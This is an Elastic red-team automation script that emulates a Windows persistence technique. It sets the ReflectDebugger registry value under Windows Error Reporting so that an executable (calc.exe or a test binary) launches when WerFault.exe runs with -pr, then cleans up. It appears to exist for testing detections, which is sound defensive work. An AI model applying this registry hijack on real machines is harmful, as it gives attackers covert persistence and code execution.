# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License;
# you may not use this file except in compliance with the Elastic License.

# Name: WerFault.exe Persistence
# RTA: werfault_persistence.py
# ATT&CK: T1112
# Description: Sets an executable to run when WerFault is run with -rp flags and runs it

import time

from . import common

MY_APP = common.get_path("bin", "myapp.exe")


@common.requires_os(common.WINDOWS)
@common.dependencies(MY_APP)
def main():
    reg_key = "'HKLM:\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\hangs'"
    reg_name = "ReflectDebugger"

    commands = ["C:\\Windows\\system32\\calc.exe",
                "'powershell -c calc.exe'",
                MY_APP]

    for command in commands:
        common.log("Setting WerFault reg key to {}".format(command))
        common.execute(["powershell", "-c", "New-ItemProperty", "-Path", reg_key,
                        "-Name", reg_name, "-Value", command], wait=False)
        time.sleep(1)

        common.log("Running WerFault.exe -pr 1")
        common.execute(["werfault", "-pr", "1"], wait=False)
        time.sleep(2.5)

        common.execute(["powershell", "-c", "Remove-ItemProperty", "-Path", reg_key, "-Name", reg_name])

    common.log("Cleaning up")

    common.execute(["taskkill", "/F", "/im", "calc.exe"])
    common.execute(["taskkill", "/F", "/im", "calculator.exe"])
    common.execute(["taskkill", "/F", "/im", "myapp.exe"])


if __name__ == '__main__':
    exit(main())
